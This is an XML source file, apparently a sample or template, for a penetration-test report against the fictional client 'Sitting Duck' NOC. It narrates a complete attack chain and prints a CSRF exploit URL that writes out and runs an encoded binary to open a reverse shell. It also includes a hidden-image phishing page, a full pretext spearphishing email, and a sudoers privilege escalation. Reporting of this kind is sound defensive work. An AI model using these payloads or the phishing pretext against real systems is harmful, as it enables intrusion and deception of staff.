@@ -1,0 +1,340 @@
+<?xml version="1.0" encoding="UTF-8"?><pentest_report xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" findingCode="SID" xsi:noNamespaceSchemaLocation="../dtd/pentestreport.xsd">
+        <meta>
+                <title>Penetration Test Report</title>
+                <client>
+                        <full_name>Sitting Duck BV</full_name>
+                        <short_name>Sitting Duck</short_name>
+                </client>
+                <targets>
+                        <target>Sitting Duck NOC</target>
+                </targets>
+                <collaborators>
+                        <reviewers>
+                                <reviewer>Melanie Rieback</reviewer>
+                        </reviewers>
+                        <approver>
+                        	<name>Melanie Rieback</name>
+                            <bio>Melanie Rieback is a former Asst. Prof. of Computer Science from the VU, who is also the co-founder/CEO of Radically Open Security.</bio>
+                        </approver>
+                        <pentesters>
+                                <pentester>
+                                        <name>Aristotle</name>
+                                        <bio>Greek philosopher and scientist born in the Macedonian city of Stagira, Chalkidice, on the northern periphery of Classical Greece.</bio>
+                                </pentester>
+                                <pentester>
+                                        <name>George Boole</name>
+                                        <bio>English mathematician, philosopher and logician. Works in the fields of differential equations and algebraic logic, and is now best known as the author of The Laws of Thought.</bio>
+                                </pentester>
+                                <pentester>
+                                        <name>William of Ockham</name>
+                                        <bio>English Franciscan friar and scholastic philosopher and theologian. Considered to be one of the major figures of medieval thought. At the centre of some major intellectual and political controversies.</bio>
+                                </pentester>
+                                <pentester>
+                                        <name>Ludwig Josef Johann Wittgenstein</name>
+                                        <bio>Austrian-British philosopher who works primarily in logic, the philosophy of mathematics, the philosophy of mind, and the philosophy of language.</bio>
+                                </pentester>
+                        </pentesters>
+                </collaborators>
+                <classification>Confidential</classification>
+                <version_history>
+                        <version date="2015-05-21T00:00:00" number="auto">
+                                <v_author>Ernest Hemingway</v_author>
+                                <v_description>Initial draft</v_description>
+                        </version>
+                        <version date="2015-05-21T00:00:10" number="auto">
+                                <v_author>Ernest Hemingway</v_author>
+                                <v_description>Structure &amp; contents revision</v_description>
+                        </version>
+                        <version date="2015-05-22T00:00:00" number="auto">
+                                <v_author>Arthur Conan Doyle</v_author>
+                                <v_description>Added threat levels and recommendations</v_description>
+                        </version>
+                        <version date="2015-05-22T00:00:01" number="auto">
+                                <v_author>JRR Tolkien</v_author>
+                                <v_description>Revision</v_description>
+                        </version>
+                        <version date="2015-05-25T00:00:00" number="auto">
+                                <v_author>JRR Tolkien</v_author>
+                                <v_description>Revision</v_description>
+                        </version>
+                        <version date="2015-05-26T00:00:00" number="auto">
+                                <v_author>Arthur Conan Doyle</v_author>
+                                <v_description>Revision</v_description>
+                        </version>
+                        <version date="2015-05-27T00:00:01" number="1.0">
+                                <v_author>Arthur Conan Doyle</v_author>
+                                <v_description>Finalizing</v_description>
+                        </version>
+                </version_history>
+                <contact>
+                        <name>Melanie Rieback</name>
+                        <address>Radically Open Security BV<br/>Overdiemerweg 28, 1111 PP Diemen</address>
+                        <phone>+31 6 10 21 32 40</phone>
+                        <email>melanie@radicallyopensecurity.com</email>
+                </contact>
+        </meta>
+        
+        <generate_index/>
+        
+        <section id="executiveSummary">
+                <title>Executive Summary</title>
+                <section id="introduction">
+                        <title>Introduction</title>
+                        <p>Sitting Duck B.V. (“Sitting Duck”) has assigned
+                                the task of performing a Penetration Test of the Sitting Duck Network Operations Center
+                                (NOC) to Radically Open Security BV (hereafter “ROS”).
+                                Sitting Duck has made this request because they wish to get a better insight on:</p>
+                                <ul>
+                                	<li>Sitting Duck's general IT security and more specifically the “sanity” of their NOC design;</li>
+                                	<li>Sitting Duck's compliance with the information security standards TPD3 / ISO 27001.</li>
+                                </ul>                            
+		                        <p>This report contains our findings as well as detailed explanations of exactly how ROS performed
+                                the penetration test.</p>
+                </section>
+                <section id="scope">
+                        <title>Scope of work</title>
+                        <p>The scope of the Sitting Duck penetration test was limited to the following
+                                targets:</p>
+                        <ul>
+                        	<li>NOC1 - 192.168.42.0/24</li>
+ 	                        <li>NOC2 - 10.0.23.0/28</li>
+    	                    <li>NOC3 - 172.16.1.0/24</li>
+                		</ul>
+                		<p>Sitting Duck requested for us to particularly focus on these parts of the attack surface:</p>
+                        <ul>
+                        	<li>Web Applications (with MultiFactor; without MultiFactor; externally facing)</li>
+    	                    <li>DNS</li>
+    	                    <li>Phishing / Malicious Site via NOC Terminal Server</li>
+    	                    <li>VPN / Firewall</li>
+                		</ul>        
+                		<p>The following areas have been specifically identified by Sitting Duck as out-of-scope:</p>
+                        <ul>
+                        	<li>No exploitation towards customer systems</li>
+ 	                        <li>No access to customer data</li>
+    	                    <li>Volumetric or Applicative DDoS</li>
+                		</ul>                  		        		
+                        <p>The penetration test was carried out from a crystal box perspective. 
+                        This means that ROS had full access to  any information needed with regards to the system(s) tested.</p>
+                </section>
+                <section id="objectives">
+                        <title>Project objectives</title>
+                        <p>The objective of the security assessment is to gain insight into the security of the systems mentioned in <a href="#scope" />.</p>
+                        <p>ROS generally performs penetration tests by identifying and fingerprinting systems, finding potential vulnerabilities, exploiting them, escalating privileges, and then pivoting to other parts of the customer's infrastructure. ROS uses open-source vulnerability scanning tools to get its bearings, but primarily finds and exploits vulnerabilities with manual testing. The means by which we do this will be described in this report.</p>
+                </section>
+                <section id="timeline">
+                        <title>Timeline</title>
+                        <p>This penetration test was performed from May 19-22, 2015, and the spearphishing attack was performed on May 20, 2015.</p>
+                </section>
+                <section id="results">
+                        <title>Results in a Nutshell</title>
+                        <p>We demonstrated a complete attack chain, from beginning to end, that totally compromises the Sitting Duck NOC.   
+                        Due to the small external attack surface, spearphishing was required to get inside the perimeter (via a NetMon vulnerability).  
+                        However, once we were inside, we had root shells throughout the entire rest of the Sitting Duck NOC infrastructure within ~1.5 hours.</p>
+                        <p>Our multi-stage attack went as follows: a spearphishing email exploited an XSS/CSRF in NetMon Viewer; we then leveraged a netmonclientd vulnerability for lateral movement to any machine in the network; and we then used found clear text credentials and passwordless sudo rights (or alternatively the netmonclientd init script) to escalate to root. (For more detail, see the Attack Narrative in <a href="#attack_narrative" />).</p>
+                        <p>Beyond the vulnerabilities that led to total compromise of the NOC, we also found a number of other issues: information leaks, XSS, more clear text credentials, password reuse, privilege escalation, Denial of Service, and arbitrary command execution. 
+                        Our findings are summarized in the next subsection, and will be described in detail later in this report.</p>
+                </section>
+                <section id="findingSummary">
+                        <title>Summary of Findings</title>
+                        <generate_findings/>
+                        <!-- generated from Findings section -->
+                </section>
+                <section id="recommendationSummary">
+                        <title>Summary of Recommendations</title>
+                        <generate_recommendations/>
+                        <!-- generated from Findings section -->
+                </section>
+        </section>
+        
+        <section id="attack_narrative">
+        	<title>Attack Narrative</title>
+        	<p>We were provided with an overview of the network infrastructure and the running services. In the following we will show how we gained access to the monitoring system, pivoted from there to the Linux management servers, escalated to root privileges, and finally compromised the entire network. The following image provides a condensed overview of Sitting Duck's NOC.</p>
+        	<img src="../graphics/noc_topology.png" width="10" />
+        	
+        	<section id="finding_vulns">
+        		<title>Step 1: Finding the NetMon Vulnerabilities</title>
+        		<p>While conducting discovery against the target systems it was discovered that a NetMon 1.4.2 installation was in place. 
+        		NetMon is enterprise network monitoring software for physical, virtual, and cloud-based IT infrastructures. The following image illustrates the login page for Sitting Duck's NetMon Viewer.</p>
+        		<img src="../graphics/netmon_login.png" width="6" />
+        		<p>While reviewing the security of this internet-facing application, we went through the changelog for NetMon, as 1.4.2 is not the most current available version. 
+        		In version 1.5, we discovered the following suspicious entry:</p>
+        		<pre>* Cleaned up the 'client/submit' routine</pre>
+        		<p>We discovered a vulnerability in this routine (see <a href="#remote_code_execution" />), which is still present in the Sitting Duck NOC installation of NetMon.
+        		The 'client/submit' routine is only accessible to logged-in users, and thus the vulnerability cannot be triggered by a remote attacker. However, no CSRF mitigation techniques could be detected (see <a href="#csrf" />) for this or any other part of NetMon, which potentially allows us to circumvent the entire login procedure through either spearfishing or waterholing.</p>
+        		<p>To perform this attack in a robust way, we wrote a payload generation script.
+        		This script generates a link containing a malicious payload that, when clicked, will spawn a reverse shell on the NetMon host, which connects back to a ROS controlled system. The script is included as <a href="#payload_script" />.</p>
+        		<p>Here is an example of the payload generation script's invocation:</p>
+        		<pre>$ python build_payload.py 192.168.0.13 31337 10.0.5.15:3000 "http://10.0.5.15:3000"
+http://10.0.5.15:3000/client/submit/%0Aecho+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEA<br />AAAAAAAAAIAECACABAhqAAAAagAAAAUAAAAAEAAA3q2%2B7%2F7h3q263cr%2BwKgADfANemnwDQ%3D%3D+%7C+base64+-d+%3E+%2Ftmp%2Fz+%3B+chmod+%2Bx+%2Ftmp%2Fz+%3B+%2Ftmp%2Fz+%26amp%3B%0A</pre>
+				<p>The payload can then be triggered as follows:</p>
+				<pre>[img]payload_url[/img]
+&lt;img src="payload_url" /&gt;</pre>
+				<p>In such a way, generated payloads can be included in an innocent-looking website, which can then be pointed to by a phishing email.  
+				And when visited, this website will exploit the NetMon host by attacking the vulnerable client/submit routine.</p>
+        	</section>
+        	<section id="spearfishing">
+        		<title>Step 2: Spearphishing the Sitting Duck Support Staff</title>
+        		<p>The targets of our spearphishing campaign were Sitting Duck Support Engineers. For this attack to properly execute, the support staff needs to be logged in at the time that the attack page is visited. In practice, the support staff at Sitting Duck always has NetMon open as they use it to continuously monitor their systems.</p>
+        		<p>By tricking one of the Sitting Duck support engineers into navigating to a website under our control, we can then leverage CSRF to have their web browser access the vulnerable NetMon Viewer script in the background. This way, the Sitting Duck NOC staff would unknowingly compromise one of the NetMon hosts themselves, through their logged-in NetMon session.</p>
+        		<p>Radically Open Security, for the purpose of this pentest, has received an account with Sitting Duck. We knew therefore that the email account management web interface was currently having problems. You can see a screenshot of the error message below.</p>
+        		<img src="../graphics/email_error/screenshot.png" />
+        		<p>In order to get the Sitting Duck Support Engineers to click on our phishing link, we figured that it would be plausible to pose as a fictional customer contacting the support regarding the email web interface error message.</p>
+        		<p>We dreamed up a fictional Dutch museum for modern art for children called 'Kinderen Museum Voor Nieuwe Kunst', that had supposedly received an account from Sitting Duck via their CEO (Daan de Boer). We knew that the was sometimes sponsoring cultural institutions, especially for children, from Sitting Duck's online press room.
+        		We then registered the domain 'kmvnk.bv', and created an IMAP account for a fictional employee, Linda Valkenburg. We then wrote a phishing email in native-speaker level Dutch, to make it extra convincing!</p>
+        		
+        		<p>Here is an English translation of the phishing email:</p>
+        		<pre>Dear Sitting Duck Support,
+
+While we're not actually a formal customer of Sitting Duck, Daan de Boer has donated a website account to us (Kinderen Museum Voor Nieuwe Kunst), since we're a museum for children.
+But we're currently having errors with the email account management. Daan suggested that I shoot an email to support@sittingduck.bv.
+
+When we navigate to the email account management in the web interface, we seem to be having a problem.
+I've posted a screenshot here: <a href="http://kmvnk.bv/screenshot.jpg">http://kmvnk.bv/screenshot.jpg</a>
+
+I'm not sure why clicking on 'here' isn't working. Because of this error message, I can't add another necessary email account for our intern, which he needs to contact visitors' groups!
+
+Anyways.. any advice about how to approach this problem would be
+appreciated!
+
+Greetings!
+Linda Valkenburg (Kinderen Museum Voor Nieuwe Kunst)</pre> 
+
+				<p>Here is a screenshot of the actual email sent to support@sittingduck.bv:</p>
+				<img src="../graphics/support_emails/00.png" width="13" />
+				
+				<p>The email was, of course, just a delivery vector for this URL:
+				<a href="http://kmvnk.bv/screenshot.jpg">http://kmvnk.bv/screenshot.jpg</a></p>
+				
+				<p>But screenshot.jpg was actually a deceptively named HTML file!
+				When this page was viewed, it would load a photoshopped screenshot of the Sitting Duck DNS management web interface, and then loaded the payload, generated by our previously mentioned script:</p>
+			<code>&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img src='screenshot_sitting_duck.jpg'&gt;
+&lt;img width=0 height=0 src='https://monitoring.sittingduck.bv/client/submit/%0Aecho+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEA<br/>AAAAAAAAAIAECACABAhqAAAAagAAAAUAAAAAEAAA3q2%2B7%2F7h3q263cr%2BwKgADfANemnwDQ%3D%3D+%7C+base64+-d+%3E+%2Ftmp%2Fz+%3B+chmod+%2Bx+%2Ftmp%2Fz+%3B+%2Ftmp%2Fz+%26amp%3B%0A&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code>
+				<p>So when viewed, the link simply displays a screenshot with an error message, that apparently belongs to the Kinderen Museum Voor Nieuwe Kunst organization.</p>
+				<p>However, in the background, the exploit is being run against the Sitting Duck NetMon instance.</p>
+				<p>We setup a netcat listener on port 443, and sent the phishing email.. and the Sitting Duck support engineers clicked! You can see the activity in this snippet from our Apache logs:</p>
+				<pre>$ tail access-log
+10.0.23.202 - - [20/May/2015:12:12:25 +0100] "GET /screenshot.jpg HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
+10.0.23.202 - - [20/May/2015:12:12:25 +0100] "GET /screenshot_sitting_duck.jpg HTTP/1.1" 200 562 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"</pre>
+		
+				<p>We now had shell access to the NetMon host as the netmonclientd user:</p>
+				<img src="../graphics/shell/netmon_remoteshell.png" />
+				
+				<p>Of course, we were curious whether or not our successful phishing attack had been noticed.
+				We received two emails back from the Sitting Duck Support Engineers: one acknowledging our support request (“We have created the following incident number YM39EXQ. Your case has been registered with medium priority”) and one requesting additional information from us:</p>
+				<img src="../graphics/support_emails/01.png" width="13" />
+				<p>We didn't respond immediately and a day later, a third email came proposing a solution.
+				We emailed back a polite acknowledgement, which should enable the Sitting Duck Support Engineer to close the ticket.</p>
+				<img src="../graphics/support_emails/02.png" width="13" />
+
+				<p>At the time of writing of this report, we have not yet heard any noises from Sitting Duck about our phishing attack having been noticed. 
+				In a real-life attack scenario, we would have immediately replaced the screenshot.jpg page with a benign screenshot, once they clicked and we had the NetMon shell access.</p>
+<p>However, we will be leaving the attack webpage (with the malicious payload) in place between now and our on-site presentation at Sitting Duck (on 15 June - 2 weeks from now), to give the Sitting Duck staff a fighting chance of noticing our successful phishing attack, and being able to conduct a full post-mortem analysis.</p>
+
+        	</section>
+        	
+        	<section id="exploiting">
+        		<title>Step 3: Exploiting the NetMon Client Daemon</title>
+        		<p>For managing the systems, NetMon uses an own netmonclientd. 
+        		On every host monitored by NetMon, the netmonclientd is installed. We used a well-known arbitrary command execution vulnerability <a href="#ace" /> in the NetMon Client to gain shell access to all of these hosts.</p>
+        		<p>This is how it works:</p>
+        		<img src="../graphics/shell/netmon_vulnerability.png" width="13" />
+				<p>Monitoring for the rest of the network is running on the NetMon host, under the same user.
+				Thus using shell access from the NetMon Client vulnerability, we were able to further pivot and gain entry into servers throughout almost the entire rest of the NOC.</p>
+        	</section>
+        	
+        	<section id="privilege_escalation">
+        		<title>Step 4: Privilege Escalation</title>
+        		<p>We already had access to most of the NOC at this point, but the netmonclientd user has quite limited privileges, so the next step was looking for privilege escalation vulnerabilities.</p>
+        		<p>On the server, we found an init script with sudo permissions for the netmonclientd user. The following is an excerpt from the /etc/sudoers from NetMon Client:</p>
+        		<pre>netmonclientd          ALL = (root)      NOPASSWD:  /usr/local/netmonclientd/init</pre>
+        		<p>Furthermore, the netmonclientd user had write permissions on this file, allowing us to modify it:</p>
+        		<pre>~rwxrwxr-x 1 netmonclientd netmonclientd 13 Jan 24 09:12 /usr/local/netmonclientd/init</pre>
+        		<p>By simply editing this script to invoke ''/bin/bash'', we gained root privileges on the Linux management server.</p>
+        		<p>We could now now su(1) to any of the Sitting Duck staff users. These users can SSH to any of the Sitting Duck hosts, where they also have root access. The access also extends, e.g., to the Linux production systems.</p>
+        		<p>This amounts to a total compromise of the NOC.</p>
+        	</section>
+        
+        </section>
+        
+        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="snippets/methodology.xml"/>
+        
+        <section id="recon">
+                <title>Reconnaissance and Fingerprinting</title>
+                <p>As part of our active reconnaissance we used the following automated scans:</p>
+                
+                <section id="scans">
+                        <title>Automated Scans</title>
+                        <p>As part of our active reconnaissance we used the following automated scans:</p>
+                        <ul>
+                                <li>nmap – <a href="http://nmap.org">http://nmap.org</a></li>
+                                <li>w3af - <a href="http://w3af.org">http://w3af.org</a></li>
+                                <li>nipper-ng - <a href="http://sectools.org/tool/nipper/">http://sectools.org/tool/nipper/</a></li>
+                        </ul>
+                        <p>Of these scans, none of the outcomes turned out to be useful.</p>
+
+				<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="scans/nmap.xml" />                                                                           
+				<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="scans/w3af.xml" />                                                                           
+				<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="scans/nipper.xml" />                                                                           
+            </section>
+
+        </section>
+        <section id="techSummary">
+                <title>Pentest Technical Summary</title>
+                <section id="findings">
+                        <title>Findings</title>                        
+                        <p>We have identified the following issues:</p>
+
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/remote_code_execution.xml" />                                                                           
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/csrf.xml" />                                                                           
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/xss.xml" />                                                       
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/xss_netmon.xml" />                                                       
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/ace.xml" />                               
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/pe.xml" />       
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/pe_management.xml" />       
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/pe_management_2.xml" />
+                        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/information_leak.xml" />
+                        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/dos.xml" />
+                        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/password_reuse.xml" />
+                        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="findings/spearphishing.xml" />
+				</section>
+                
+                <section id="nonFindings">
+                        <title>Non-Findings and Future Work</title>
+                        <p>In this section we list some of the things that were tried but turned out to be dead ends.</p>
+                        
+                        <section id="dead_ends">
+                        <title>Non-Findings</title>
+                        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="non-findings/osw.xml" />
+                        <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="non-findings/shielded_webapps.xml" />
+						<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="non-findings/brute_force.xml" />
+     					</section>
+     					<section id="future_work">
+     						<title>Future Work</title>
+							<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="future-work/juniper.xml" />
+                      		<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="future-work/vpn.xml" />              	
+     					</section>
+                </section>
+        </section>
+        <section id="conclusion">
+                <title>Conclusion</title>
+                <p>We demonstrated a complete attack chain, from beginning to end, that totally compromises the Sitting Duck NOC. We conducted a multi-stage attack: a spearshishing email that exploited an XSS/CSRF in NetMon; we then leveraged a netmonclientd vulnerability for lateral movement to any machine in the network; and we then used found clear text credentials + passwordless sudo rights (or alternatively the netmonclient init script) to escalate to root. Beyond the vulnerabilities that led to compromise of the NOC, we also found a number of other issues: information leaks, XSS, more clear text credentials, password reuse, privilege escalation, Denial of Service, and arbitrary command execution.</p>
+                <p>Fortunately, a number of the technical security issues highlighted in this report have fairly simple solutions. (See <a href="#recommendationSummary" /> for our recommendations.) The most critical of the issues to fix is NetMon. </p>
+                <p>Sitting Duck's vulnerability to our spearphishing attack is a more difficult problem to solve. Awareness training certainly helps. However, technical solutions are also required as a backup, because awareness training will only get you so far. There is a number of points where our phishing Proof of Concept (PoC) could have been easily detected. Most prominently, ''Kinderen Museum Voor Nieuwe Kunst'' did not actually have a account with Sitting Duck.. so this would not have survived the least amount of scrutiny by the Support Engineer. Furthermore, the phishing domain was registered a couple of days prior to our sending the actual phishing email. (Anomaly detection hooked up to Sitting Duck's email gateway might be able to help here.) While a bit unwieldy, isolating the email client (like sandboxing it in a dedicated VM) might also help.
+</p>
+		<p>We finally want to emphasize that security is a process – and this penetration test is just a one-time snapshot. Security posture must be continuously evaluated and improved. Regular audits and ongoing improvements are essential in order to maintain control of your corporate information security. We hope that this pentest report (and the detailed explanations of our findings) will contribute meaningfully towards that end. Don't hesitate to let us know if you have any further questions or need further clarification of anything in this report.</p>
+        </section>
+        
+        <appendix id="testteam">
+                <title>Testing team</title>
+                <generate_testteam/>
+        </appendix>
+
+		<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="appendix/payload_script.xml" />
+
+</pentest_report>
